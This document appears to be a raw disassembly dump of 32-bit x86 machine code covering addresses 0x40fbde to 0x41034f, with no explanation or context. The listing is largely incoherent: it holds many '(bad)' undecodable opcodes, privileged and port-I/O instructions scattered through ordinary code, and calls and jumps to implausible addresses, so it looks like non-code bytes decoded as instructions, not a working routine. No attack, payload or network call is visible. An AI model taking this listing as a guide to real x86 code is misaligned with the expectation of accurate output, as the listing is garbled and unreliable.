  40fbde:	mov    eax,DWORD PTR [ebp+0x10]
  40fbe1:	jne    0x40fb6c
  40fbe3:	mov    eax,DWORD PTR [ecx]
  40fbe5:	clc    
  40fbe6:	add    BYTE PTR [ebp-0x40],cl
  40fbe9:	xor    edx,DWORD PTR [eax-0x73]
  40fbec:	jne    0x40fbef
  40fbee:	push   DWORD PTR [edx+0x8]
  40fbf1:	add    BYTE PTR [ebp+0x45],al
  40fbf4:	mov    ebp,ecx
  40fbf6:	cld    
  40fbf7:	add    BYTE PTR [ebp+0x0],cl
  40fbfa:	xor    eax,DWORD PTR [ebp+0x3]
  40fbfd:	lea    edi,[ebx]
  40fbff:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  40fc05:	sub    eax,0x5d330e4d
  40fc0a:	lea    esi,[ebx]
  40fc0c:	add    DWORD PTR [ebx],eax
  40fc0e:	jb     0x40fbf9
  40fc10:	add    BYTE PTR [eax],al
  40fc12:	inc    ebp
  40fc13:	add    bl,ch
  40fc15:	inc    ebp
  40fc16:	mov    esi,DWORD PTR [ebx]
  40fc18:	or     al,0x3
  40fc1a:	(bad)  
  40fc1b:	mov    edi,eax
  40fc1d:	in     al,dx
  40fc1e:	scas   eax,DWORD PTR es:[edi]
  40fc1f:	inc    ebp
  40fc20:	mov    esi,DWORD PTR [ebx]
  40fc22:	in     al,0x3
  40fc24:	add    al,0x89
  40fc26:	mov    ecx,DWORD PTR [eax+edi*8]
  40fc29:	dec    ebp
  40fc2a:	(bad)  
  40fc2b:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3163]
  40fc32:	mov    ecx,eax
  40fc34:	cld    
  40fc35:	push   es
  40fc36:	dec    ebp
  40fc37:	add    al,0x33
  40fc39:	mov    DWORD PTR [ebx],eax
  40fc3b:	in     al,dx
  40fc3c:	cmp    DWORD PTR [ebp-0x67],eax
  40fc3f:	mov    eax,DWORD PTR [ebp-0xba0068]
  40fc45:	mov    edx,DWORD PTR [ebp-0x4]
  40fc48:	mov    ecx,DWORD PTR [ebp-0x18]
  40fc4b:	xor    ecx,DWORD PTR [ebp+0x3]
  40fc4e:	cmp    DWORD PTR [ebx],0x8b32749c
  40fc54:	xor    edi,esp
  40fc56:	jmp    0xff74f9a8
  40fc5b:	add    ecx,DWORD PTR [ebp-0x3f]
  40fc5e:	xor    ebx,DWORD PTR [edi]
  40fc60:	add    eax,ecx
  40fc62:	cmp    ebx,DWORD PTR [eax]
  40fc64:	mov    ecx,DWORD PTR [ebp-0x4]
  40fc67:	mov    ecx,DWORD PTR [eax]
  40fc69:	adc    BYTE PTR [ebp-0x80],al
  40fc6c:	jmp    0x40fc6f
  40fc6e:	mov    eax,DWORD PTR [eax]
  40fc70:	cld    
  40fc71:	mov    bh,0xc6
  40fc73:	push   ecx
  40fc74:	(bad)  
  40fc75:	jne    0x40fcd5
  40fc77:	dec    ecx
  40fc79:	or     BYTE PTR [ecx+ebx*1],cl
  40fc7c:	push   ebp
  40fc7d:	inc    ebp
  40fc7e:	in     al,dx
  40fc7f:	add    ebp,esp
  40fc81:	or     bh,al
  40fc83:	dec    ebp
  40fc84:	cld    
  40fc85:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  40fc8b:	xor    DWORD PTR [edx],0x2
  40fc8e:	pushf  
  40fc8f:	dec    DWORD PTR [ebx+0x45510cf4]
  40fc95:	mov    DWORD PTR [ebx+0x5645fc0c],ecx
  40fc9b:	mov    edx,DWORD PTR [ecx+0xc]
  40fc9e:	xor    eax,esi
  40fca0:	mov    edx,0xc172c7
  40fca5:	inc    ebp
  40fca6:	mov    esi,DWORD PTR [ebp+0x8]
  40fca9:	mov    eax,edx
  40fcab:	call   0x84c5c3a0
  40fcb0:	add    DWORD PTR [ebp-0x76bace00],ebx
  40fcb6:	mov    ebp,eax
  40fcb8:	or     BYTE PTR [eax],dl
  40fcba:	jo     0x40fd09
  40fcbc:	push   edi
  40fcbd:	xor    esi,DWORD PTR [ebp+0x3]
  40fcc0:	(bad)  
  40fcc1:	pmulhuw mm0,mm1
  40fcc4:	test   DWORD PTR [ebp-0x8],ecx
  40fcc7:	mov    DWORD PTR [ebp-0x67],eax
  40fcca:	mov    eax,DWORD PTR [ebp-0x4]
  40fccd:	xor    edi,DWORD PTR [ebp-0x73]
  40fcd0:	xor    eax,DWORD PTR [ebx]
  40fcd2:	xor    esi,DWORD PTR [edx+0x3]
  40fcd5:	add    BYTE PTR [ecx],bh
  40fcd7:	inc    ebp
  40fcd8:	(bad)  
  40fcd9:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  40fcdf:	mov    DWORD PTR [eax],0x750f0004
  40fce5:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  40fceb:	lock add BYTE PTR [ebp+0x0],al
  40fcef:	mov    esi,DWORD PTR [ebp-0x2c]
  40fcf2:	mov    ebp,edx
  40fcf4:	or     al,0x72
  40fcf6:	ja     0x40fcf8
  40fcf8:	mov    edx,esi
  40fcfa:	cld    
  40fcfb:	(bad)  
  40fcfe:	cli    
  40fcff:	mov    esi,DWORD PTR [ebp-0x4]
  40fd02:	cmp    ecx,esi
  40fd04:	bswap  edi
  40fd06:	(bad)
  40fd0a:	mov    esi,DWORD PTR [ebp-0x4]
  40fd0d:	mov    esi,ecx
  40fd0f:	clc    
  40fd10:	repnz add esi,DWORD PTR [ebp+0x45]
  40fd14:	push   ebx
  40fd15:	xor    eax,DWORD PTR [ebp+0x3]
  40fd18:	xor    BYTE PTR [edi-0x64],bl
  40fd1b:	pop    ebx
  40fd1c:	jmp    0x40fde3
  40fd21:	mov    esi,DWORD PTR [ebp-0x7d]
  40fd24:	xor    ebp,DWORD PTR [eax]
  40fd26:	lea    eax,[ebp-0x8]
  40fd29:	xor    eax,0xc7ef9cf2
  40fd2e:	neg    eax
  40fd30:	ins    DWORD PTR es:[edi],dx
  40fd31:	test   esi,edi
  40fd33:	clc    
  40fd34:	pop    esp
  40fd35:	inc    ebp
  40fd36:	or     BYTE PTR [ecx+0x450f0c7d],cl
  40fd3c:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  40fd42:	add    cl,al
  40fd44:	jne    0x40fce3
  40fd46:	mov    esi,DWORD PTR [edx]
  40fd48:	in     al,dx
  40fd49:	push   esi
  40fd4a:	xor    BYTE PTR [ebp-0xe],dh
  40fd4d:	add    edi,esi
  40fd4f:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  40fd55:	add    cl,bh
  40fd57:	mov    edi,DWORD PTR [ebp+0x8]
  40fd5a:	mov    DWORD PTR [ebp-0x14],esi
  40fd5d:	add    esi,DWORD PTR [ebp+0x3c]
  40fd60:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  40fd66:	mov    ah,0x3e
  40fd68:	popf   
  40fd69:	pushf  
  40fd6a:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  40fd70:	jne    0x40fcfd
  40fd72:	mov    ecx,DWORD PTR [esp+ebp*8]
  40fd75:	icebp  
  40fd76:	icebp  
  40fd77:	shl    edx,0xf2
  40fd7a:	(bad)  
  40fd7b:	mov    ah,0x16
  40fd7d:	pusha  
  40fd7e:	jne    0x40fd13
  40fd80:	mov    ecx,DWORD PTR [edi]
  40fd82:	in     al,dx
  40fd83:	jmp    0x40fd76
  40fd85:	add    dl,dh
  40fd87:	mov    edi,esi
  40fd89:	or     al,0x8
  40fd8b:	inc    ebp
  40fd8c:	jne    0x40fd91
  40fd8e:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  40fd94:	ret    
  40fd95:	or     bh,bh
  40fd97:	jge    0x40fd81
  40fd99:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  40fd9f:	xor    edi,eax
  40fda1:	add    esi,DWORD PTR [ebp-0x77]
  40fda4:	mov    ebx,esp
  40fda6:	clc    
  40fda7:	neg    DWORD PTR [ebp-0x7c]
  40fdaa:	xor    eax,DWORD PTR [eax]
  40fdac:	cmp    eax,DWORD PTR [eax]
  40fdae:	repz jne 0x40fd46
  40fdb1:	xor    eax,DWORD PTR [ecx]
  40fdb3:	add    ebx,DWORD PTR [eax]
  40fdb5:	mov    DWORD PTR [ebp-0x8],eax
  40fdb8:	mov    eax,edi
  40fdba:	cld    
  40fdbb:	lock pop eax
  40fdbd:	test   DWORD PTR [ebx],esi
  40fdbf:	clc    
  40fdc0:	add    edx,DWORD PTR [edi-0x740bff77]
  40fdc6:	fdivp  st(4),st
  40fdc8:	test   ecx,esi
  40fdca:	(bad)  
  40fdcb:	jnp    0x40fdcc
  40fdcd:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  40fdd3:	jae    0x40fd60
  40fdd5:	sub    edi,esp
  40fdd7:	(bad)  
  40fdd8:	shl    DWORD PTR [eax-0x3e],0x89
  40fddc:	leave  
  40fddd:	call   0x8196b4ea
  40fde2:	in     al,dx
  40fde3:	(bad)  
  40fde4:	in     al,dx
  40fde5:	add    bh,al
  40fde7:	mov    esp,edi
  40fde9:	in     al,dx
  40fdea:	test   DWORD PTR [ebp-0x8],edi
  40fded:	mov    eax,DWORD PTR [ebp+0x2b]
  40fdf0:	xor    al,BYTE PTR [ebx]
  40fdf2:	pushf  
  40fdf3:	jnp    0x572ffa2c
  40fdf9:	xor    edx,DWORD PTR [esi-0x77]
  40fdfc:	push   ecx
  40fdfd:	loopne 0x40fe32
  40fdff:	jne    0x40fdbc
  40fe01:	mov    esi,DWORD PTR [edx-0x20]
  40fe04:	add    BYTE PTR [ebp-0x3d],bh
  40fe07:	xor    eax,DWORD PTR [ebp-0x73]
  40fe0a:	mov    edi,DWORD PTR [esi]
  40fe0c:	cld    
  40fe0d:	jb     0x40fdd5
  40fe0f:	add    bl,al
  40fe11:	jne    0x40fe58
  40fe13:	mov    edx,DWORD PTR [edi-0x10]
  40fe16:	jge    0x40fe95
  40fe18:	mov    esi,DWORD PTR [ebx]
  40fe1a:	lock add ecx,DWORD PTR [ebp+0x3b]
  40fe1e:	xor    esi,DWORD PTR [ebp-0x77]
  40fe21:	mov    esi,eax
  40fe23:	lock inc ebp
  40fe25:	jge    0x40fe5c
  40fe27:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  40fe2e:	dec    ebp
  40fe2f:	mov    esi,DWORD PTR [ebx]
  40fe31:	loopne 0x40fdbc
  40fe33:	jge    0x40fe2d
  40fe35:	add    DWORD PTR [ebp-0x7d],eax
  40fe38:	cmc    
  40fe39:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  40fe40:	dec    ebp
  40fe41:	hlt    
  40fe42:	xor    ebx,DWORD PTR [ebp-0x77]
  40fe45:	mov    esi,esp
  40fe47:	in     al,0x45
  40fe49:	jge    0x40fe7c
  40fe4b:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  40fe52:	dec    ebp
  40fe53:	xor    edx,DWORD PTR fs:[ebx+0x3ec7389]
  40fe5a:	inc    ebp
  40fe5b:	hlt    
  40fe5c:	xor    eax,0xb88b9f75
  40fe61:	add    al,0x95
  40fe63:	icebp  
  40fe64:	add    dl,dh
  40fe66:	mov    DWORD PTR [ebp+0x20],ebx
  40fe69:	cmp    eax,DWORD PTR [ebp+0xf]
  40fe6c:	test   DWORD PTR [edi+ecx*1-0x1],edx
  40fe70:	fistp  WORD PTR [ebx+0x0]
  40fe73:	inc    ebp
  40fe74:	mov    ebx,DWORD PTR [edi+0xc]
  40fe77:	add    eax,eax
  40fe79:	inc    ebp
  40fe7a:	test   BYTE PTR [ebx],dh
  40fe7c:	add    eax,DWORD PTR [ebx]
  40fe7e:	add    BYTE PTR [esi+0x45],bl
  40fe81:	ret    0x85
  40fe84:	jnp    0x54418253
  40fe8a:	inc    bp
  40fe8c:	inc    ebp
  40fe8d:	xor    eax,0xc78a9cb9
  40fe92:	add    ah,bl
  40fe94:	xor    eax,DWORD PTR [ebp+0x453bf8b9]
  40fe9a:	add    BYTE PTR [ebx+0x3],dl
  40fe9d:	mov    esi,0x708088b
  40fea2:	cmp    esi,eax
  40fea4:	setge  BYTE PTR [ecx-0x74fcffce]
  40feab:	mov    esp,edi
  40fead:	call   0x33cc43ff
  40feb2:	or     BYTE PTR [ebx],al
  40feb4:	inc    ecx
  40feb5:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  40febb:	and    BYTE PTR [ebp-0x7074f0bb],al
  40fec1:	lock add cl,al
  40fec4:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  40fecb:	mov    ch,0x45
  40fecd:	clc    
  40fece:	xor    eax,DWORD PTR [ebp+0x3]
  40fed1:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  40fed7:	inc    ebp
  40fed8:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  40fede:	mov    edi,eax
  40fee0:	mov    eax,DWORD PTR [ebp+0x3c]
  40fee3:	mov    ecx,DWORD PTR [eax]
  40fee5:	hlt    
  40fee6:	inc    ebp
  40fee7:	ror    DWORD PTR [ebx+0x818c45],0xf4
  40feee:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  40fef4:	push   ebp
  40fef5:	mov    edi,DWORD PTR [ebx]
  40fef7:	in     al,dx
  40fef8:	jne    0x40febb
  40fefa:	mov    eax,DWORD PTR [ebp-0x28]
  40fefd:	add    DWORD PTR [eax],0xe8058dec
  40ff03:	clc    
  40ff04:	mov    eax,DWORD PTR [edi]
  40ff06:	clc    
  40ff07:	add    dh,dl
  40ff09:	rol    WORD PTR [ebp-0x1],cl
  40ff0d:	mov    edx,DWORD PTR [eax+0x8]
  40ff10:	jne    0x40fed2
  40ff12:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  40ff19:	inc    ebp
  40ff1a:	push   esp
  40ff1b:	test   DWORD PTR [ecx+0xf],ecx
  40ff1e:	sub    edx,esp
  40ff20:	add    eax,DWORD PTR [eax]
  40ff22:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  40ff28:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  40ff2f:	mov    eax,DWORD PTR [ecx]
  40ff31:	and    BYTE PTR [eax],al
  40ff33:	inc    eax
  40ff34:	adc    BYTE PTR [eax],al
  40ff36:	inc    ebp
  40ff37:	inc    cx
  40ff3a:	push   esp
  40ff3b:	push   es
  40ff3c:	jne    0x40ff3e
  40ff3e:	push   edx
  40ff3f:	enterw 0xc1,0x4d
  40ff44:	mov    esp,DWORD PTR [esi+0x20]
  40ff47:	add    DWORD PTR [ecx-0x7b],eax
  40ff4a:	add    eax,DWORD PTR [ebx]
  40ff4c:	str    WORD PTR [eax+0x45]
  40ff50:	lea    ecx,[ebx+0x45890801]
  40ff56:	sbb    BYTE PTR [ebx],al
  40ff58:	dec    ebp
  40ff59:	cmp    al,0xf
  40ff5b:	inc    ebp
  40ff5c:	push   eax
  40ff5d:	mov    esi,DWORD PTR [ebx]
  40ff5f:	push   eax
  40ff60:	add    eax,eax
  40ff62:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  40ff69:	inc    ebp
  40ff6a:	add    BYTE PTR ds:0x8b4d8c00,dh
  40ff70:	xor    edx,esp
  40ff72:	add    eax,esi
  40ff74:	mov    ebx,eax
  40ff76:	loopne 0x40ffbd
  40ff78:	dec    ebp
  40ff79:	mov    ecx,DWORD PTR [edi]
  40ff7b:	cld    
  40ff7c:	push   eax
  40ff7d:	xchg   DWORD PTR [ebx],esi
  40ff7f:	add    DWORD PTR [ebx],ebp
  40ff81:	add    BYTE PTR [ebx],ch
  40ff83:	or     BYTE PTR [ecx],bh
  40ff85:	dec    ecx
  40ff86:	loopne 0x40ff8b
  40ff88:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  40ff8e:	push   ebp
  40ff8f:	add    DWORD PTR [ebx+0x55100800],eax
  40ff95:	dec    ebp
  40ff96:	jmp    0x40ff21
  40ff98:	mov    esp,DWORD PTR [eax]
  40ff9a:	sbb    dl,dl
  40ff9c:	inc    eax
  40ff9d:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  40ffa3:	add    BYTE PTR [ebx+0x74528555],cl
  40ffa9:	push   ebp
  40ffaa:	div    DWORD PTR [ebx]
  40ffac:	and    eax,DWORD PTR [ebx]
  40ffae:	add    edx,DWORD PTR [edx-0x30]
  40ffb1:	jno    0x40ff3e
  40ffb3:	inc    DWORD PTR [eax+eiz*1]
  40ffb6:	inc    ebp
  40ffb7:	push   eax
  40ffb8:	push   eax
  40ffb9:	mov    esp,DWORD PTR [edi-0x74beff1c]
  40ffbf:	mov    edi,esp
  40ffc1:	push   eax
  40ffc2:	inc    ebp
  40ffc3:	enter  0x458b,0x8
  40ffc7:	push   ecx
  40ffc8:	(bad)  
  40ffc9:	call   0x10b09a1
  40ffce:	pop    ss
  40ffcf:	push   ebp
  40ffd0:	mov    ecx,DWORD PTR [ebx+0x489408]
  40ffd6:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  40ffdc:	push   ecx
  40ffdd:	jo     0x40ffc7
  40ffdf:	inc    DWORD PTR [edi]
  40ffe1:	or     BYTE PTR [eax],al
  40ffe3:	call   0xcc072d
  40ffe8:	fmul   QWORD PTR [ebp+0x55]
  40ffeb:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  40fff1:	mov    bh,0x8c
  40fff3:	adc    al,0x9d
  40fff5:	dec    esp
  40fff6:	xor    bl,BYTE PTR [eax]
  40fff8:	mov    ecx,DWORD PTR [ebp+0xc]
  40fffb:	mov    eax,DWORD PTR [ebp-0x4]
  40fffe:	mov    esi,DWORD PTR [edi-0x3148f924]
  410004:	push   es
  410005:	retf   
  410006:	mov    BYTE PTR [ebp-0x30],0x3b
  41000a:	inc    ebp
  41000b:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  410012:	retf   0x83fc
  410015:	into   
  410016:	dec    ebp
  410017:	retf   
  410018:	mov    ecx,DWORD PTR [ebp-0x74]
  41001b:	mov    eax,DWORD PTR [eax]
  41001d:	fdiv   QWORD PTR [ebx]
  41001f:	mov    bh,0x3
  410021:	push   es
  410022:	mov    esi,ecx
  410024:	sbb    cl,dl
  410026:	dec    ebp
  410027:	sar    DWORD PTR [ebx],cl
  410029:	push   ebp
  41002a:	jne    0x41003b
  41002c:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  410032:	lea    ebx,[eax]
  410034:	call   0xf4ca8bfb
  410039:	sbb    dh,dl
  41003b:	add    edx,ebx
  41003d:	push   ebp
  41003e:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  410044:	push   ecx
  410045:	mov    DWORD PTR [eax-0x30],edx
  410048:	test   DWORD PTR [edx],eax
  41004a:	xadd   esp,esi
  41004d:	pop    es
  41004e:	add    cl,dl
  410050:	mov    eax,ecx
  410052:	or     al,0x45
  410054:	(bad)  
  410055:	push   eax
  410056:	add    DWORD PTR [edx+0x0],eax
  410059:	add    ecx,DWORD PTR [ecx]
  41005b:	and    dh,cl
  41005d:	call   0xc5092d
  410062:	add    DWORD PTR [ebp+0x0],edx
  410065:	mov    esp,DWORD PTR [ebp+0x18]
  410068:	add    BYTE PTR [eax+0x28],cl
  41006b:	xor    eax,DWORD PTR [eax]
  41006d:	add    esp,DWORD PTR [esi+0x3b]
  410070:	inc    ebp
  410071:	je     0x40fff6
  410073:	push   ecx
  410074:	push   es
  410075:	dec    ebp
  410076:	mov    DWORD PTR [ebx],eax
  410078:	(bad)  
  410079:	or     al,0x1e
  41007b:	inc    eax
  41007c:	add    BYTE PTR [ebx],al
  41007e:	data16 and BYTE PTR [ebp+0x50],al
  410082:	sub    DWORD PTR [ecx],0x8
  410085:	add    BYTE PTR [ebp-0x75],ah
  410088:	add    BYTE PTR [eax],bl
  41008a:	enter  0x894d,0x8b
  41008e:	int3   
  41008f:	loopne 0x41004b
  410091:	rol    BYTE PTR [eax],0x33
  410094:	lea    cx,[ebp+0xa]
  410098:	data16 jb 0x4100e0
  41009b:	add    BYTE PTR [ebx+0x44890855],cl
  4100a1:	sbb    ah,al
  4100a3:	inc    ebp
  4100a4:	inc    eax
  4100a5:	lldt   WORD PTR [edx+0x66]
  4100a9:	xor    ecx,DWORD PTR [eax]
  4100ab:	sub    eax,DWORD PTR [esi]
  4100ad:	mov    eax,DWORD PTR [eax]
  4100af:	or     al,0x66
  4100b1:	ror    edx,cl
  4100b3:	dec    ebp
  4100b4:	inc    ebp
  4100b5:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  4100bb:	cld    
  4100bc:	or     BYTE PTR [edi+0x4501dd],dl
  4100c2:	retf   0xe0ce
  4100c5:	retf   
  4100c6:	(bad)  
  4100c7:	dec    ebp
  4100c8:	mov    al,0x8b
  4100ca:	in     al,dx
  4100cb:	and    BYTE PTR [ebx],dh
  4100cd:	or     al,BYTE PTR [ebp+0x27]
  4100d0:	in     al,dx
  4100d1:	xchg   eax,esp
  4100d3:	add    edi,eax
  4100d5:	add    BYTE PTR [eax+0x3f52ed55],bh
  4100db:	push   ebp
  4100dc:	inc    ebp
  4100dd:	xor    edx,edx
  4100df:	add    esp,eax
  4100e1:	push   edx
  4100e2:	push   bp
  4100e4:	inc    ebp
  4100e5:	jmp    ecx
  4100e7:	push   esp
  4100e8:	(bad)  
  4100e9:	inc    edx
  4100eb:	sbb    al,0x33
  4100ed:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4100f4:	add    BYTE PTR [ebp+0x48],0x8b
  4100f8:	jmp    0xf98b:0x100041c8
  4100ff:	xor    esi,DWORD PTR [edx+0x3]
  410102:	mov    ecx,DWORD PTR [edi]
  410104:	fmul   DWORD PTR [edx]
  410106:	add    BYTE PTR [eax],al
  410108:	lea    eax,[ebx-0x4700273c]
  41010e:	add    al,0x4f
  410110:	pop    DWORD PTR [eax]
  410112:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  410118:	push   edx
  410119:	inc    WORD PTR [ebp+0x8]
  41011d:	mov    eax,0x514f4d
  410122:	(bad)
  410126:	add    al,al
  410128:	xor    DWORD PTR [ebx-0x74baf730],eax
  41012e:	test   DWORD PTR [esi+0x74],esp
  410131:	inc    ebp
  410132:	mov    DWORD PTR [eax+0xa4e08],edi
  410138:	add    BYTE PTR [ecx-0x76c435bb],cl
  41013e:	or     dh,cl
  410140:	or     eax,0x8b8d5045
  410145:	inc    ebp
  410146:	mov    WORD PTR [ecx+0x3b8a00],?
  41014c:	jne    0x410181
  41014e:	mov    edi,DWORD PTR [edx+0x8f3b18]
  410154:	add    DWORD PTR [ebx],eax
  410156:	add    bh,bh
  410158:	adc    DWORD PTR [eax],ecx
  41015a:	adc    DWORD PTR [ebp+0x55],edi
  41015d:	push   es
  41015e:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  410164:	mov    ebp,DWORD PTR [eax+ebp*1+0x503411d2]
  41016b:	inc    ebp
  41016c:	mov    edx,edi
  41016e:	or     al,0xd2
  410170:	push   eax
  410171:	(bad)  
  410172:	jne    0x410128
  410174:	call   0x28fa5b
  410179:	inc    ebp
  41017a:	shl    BYTE PTR [esp+eax*4],0xe0
  41017e:	add    bh,al
  410180:	add    BYTE PTR [ebp+esi*2-0x2c742e],bh
  410187:	(bad)  
  410188:	and    al,al
  41018a:	fs loope 0x41018c
  41018d:	inc    ebp
  41018e:	test   DWORD PTR [esi+0xf],edi
  410191:	leave  
  410192:	scas   al,BYTE PTR es:[edi]
  410193:	inc    esp
  410194:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  41019b:	or     BYTE PTR [ebx-0x97717ca],0x83
  4101a2:	call   DWORD PTR [edi]
  4101a4:	shr    ah,0x84
  4101a7:	xchg   DWORD PTR [eax],eax
  4101a9:	add    DWORD PTR [eax],eax
  4101ab:	add    bh,bh
  4101ad:	dec    ebp
  4101ae:	and    BYTE PTR [ecx-0x38],dl
  4101b1:	push   eax
  4101b2:	dec    DWORD PTR [ebx+0xfd885]
  4101b8:	mov    BYTE PTR [ebp+0x508bac00],cl
  4101be:	mov    WORD PTR [ecx+0x0],ss
  4101c1:	lea    ecx,[ebx+0x108b20d8]
  4101c7:	mov    WORD PTR [edx],ds
  4101c9:	add    BYTE PTR [edi+0xff01ff],al
  4101cf:	mov    ecx,DWORD PTR [ebp-0x28]
  4101d2:	push   ecx
  4101d3:	shl    BYTE PTR [ebp+0x3a],0x8b
  4101d7:	inc    ebp
  4101d8:	in     al,0xeb
  4101da:	jno    0x410167
  4101dc:	push   edx
  4101dd:	mov    DWORD PTR [eax-0x28],edx
  4101e0:	mov    eax,DWORD PTR [ebp+0x20]
  4101e3:	je     0x41016c
  4101e5:	mov    eax,DWORD PTR [ecx]
  4101e7:	sbb    BYTE PTR [eax],al
  4101e9:	pop    DWORD PTR [eax]
  4101eb:	add    esi,eax
  4101ed:	add    bl,al
  4101ef:	adc    DWORD PTR [edi],esi
  4101f1:	jmp    0x8bcc5243
  4101f6:	sub    BYTE PTR [ebp+eax*2-0x63c4cb00],cl
  4101fd:	jne    0x41018a
  4101ff:	mov    ecx,DWORD PTR [eax]
  410201:	in     al,0x75
  410203:	pop    DWORD PTR [ecx+0x5601]
  410209:	push   edx
  41020a:	inc    DWORD PTR [ebx]
  41020c:	adc    BYTE PTR [ecx+0x45721cc6],cl
  410212:	add    BYTE PTR [edi+0x9],dl
  410215:	call   DWORD PTR [esi]
  410217:	and    dl,al
  410219:	and    bh,bh
  41021b:	inc    edi
  41021d:	test   eax,edx
  41021f:	sldt   ebx
  410222:	xor    al,BYTE PTR [eax]
  410224:	pushf  
  410225:	(bad)  
  410226:	jmp    0x410234
  410228:	mov    eax,edi
  41022a:	or     al,0x75
  41022c:	inc    eax
  41022d:	call   0x40f935
  410232:	mov    eax,eax
  410234:	loopne 0x4101ba
  410236:	inc    ebp
  410237:	add    BYTE PTR [ebx+0x1451c00],cl
  41023d:	mov    eax,DWORD PTR [ebp+0x20]
  410240:	add    edi,ecx
  410242:	add    BYTE PTR [eax],ch
  410244:	cmp    edi,0x18
  410247:	test   DWORD PTR [ebp+0xf],esi
  41024a:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  410251:	jne    0x410255
  410253:	call   0xff9ffd18
  410258:	leave  
  410259:	rcr    BYTE PTR [esp+eax*4],0x55
  41025d:	add    ah,ch
  41025f:	add    BYTE PTR [edi-0x48fef979],dh
  410265:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  41026c:	inc    esp
  41026d:	mov    ebx,DWORD PTR [eax]
  41026f:	fcom   st(2)
  410271:	add    BYTE PTR [edi],bl
  410273:	lea    ecx,[eax-0x18]
  410276:	(bad)  
  410277:	push   DWORD PTR [ecx]
  410279:	call   0xffb34fdb
  41027e:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  410282:	fstp   DWORD PTR [esi+ebx*8]
  410285:	push   ebp
  410286:	pop    ebp
  410287:	mov    esi,DWORD PTR [edx-0x38]
  41028a:	add    DWORD PTR [eax],0x28
  41028d:	mov    edi,DWORD PTR [ebx]
  41028f:	xor    esi,DWORD PTR [edx+0x3]
  410292:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  410296:	pop    ebp
  410297:	or     al,0x4
  410299:	inc    ecx
  41029a:	push   ebp
  41029b:	(bad)  
  41029c:	in     al,dx
  41029d:	or     ah,ch
  41029f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102a0:	xbegin 0xffc67896
  4102a6:	clc    
  4102a7:	adc    al,0x45
  4102a9:	div    BYTE PTR [edx]
  4102ab:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  4102b2:	test   DWORD PTR [ebp+0x661b00f8],ebx
  4102b8:	add    BYTE PTR [ecx+0x66],dh
  4102bb:	add    eax,DWORD PTR [ebp+0x52]
  4102be:	adc    eax,0x60
  4102c1:	xchg   DWORD PTR [ecx+0x3400fc01],ecx
  4102c7:	test   DWORD PTR [eax],eax
  4102c9:	clc    
  4102ca:	data16 or al,BYTE PTR [ebp+0x45]
  4102ce:	or     DWORD PTR [ebx-0x3d76d720],0xfffffff8
  4102d5:	rol    BYTE PTR [ebp+0x45],1
  4102d8:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4102de:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4102e4:	push   ebx
  4102e5:	add    BYTE PTR [esi+0x0],dl
  4102e8:	push   ecx
  4102e9:	jge    0x41031e
  4102eb:	add    BYTE PTR [esi+0x4],dl
  4102ee:	jne    0x410355
  4102f0:	mov    edx,0x457200
  4102f5:	jmp    0x4102b9
  4102f7:	xor    edi,DWORD PTR [ebx]
  4102f9:	pop    edi
  4102fa:	cvtdq2ps xmm7,xmm0
  4102fd:	ret    0x0
  410300:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  410306:	xor    ecx,DWORD PTR [edi]
  410308:	add    eax,DWORD PTR [ecx+0x3b]
  41030b:	push   ebx
  41030c:	rdpmc  
  41030e:	out    0x8d,al
  410310:	add    BYTE PTR [eax],cl
  410312:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  410318:	ret    0x450c
  41031b:	sbb    al,0x8b
  41031d:	cmp    eax,esi
  41031f:	or     cl,al
  410321:	or     al,0xc2
  410323:	pop    eax
  410324:	inc    ebp
  410325:	add    ecx,DWORD PTR [edi]
  410327:	add    esi,DWORD PTR [ebp+0x39]
  41032a:	invd   
  41032c:	jge    0x410338
  41032e:	mov    eax,0x478ac0
  410333:	cli    
  410334:	xor    esp,ecx
  410336:	mov    ebx,0x5b8ac0
  41033b:	ret    0x33
  41033e:	mov    eax,0x833b8b
  410343:	sub    BYTE PTR [ebx],al
  410345:	inc    ebp
  410346:	xor    ax,0x9cf8
  41034a:	inc    bh
  41034c:	mov    esp,esp
  41034e:	hlt    
  41034f:	test   DWORD PTR [ebp-0x8],esi
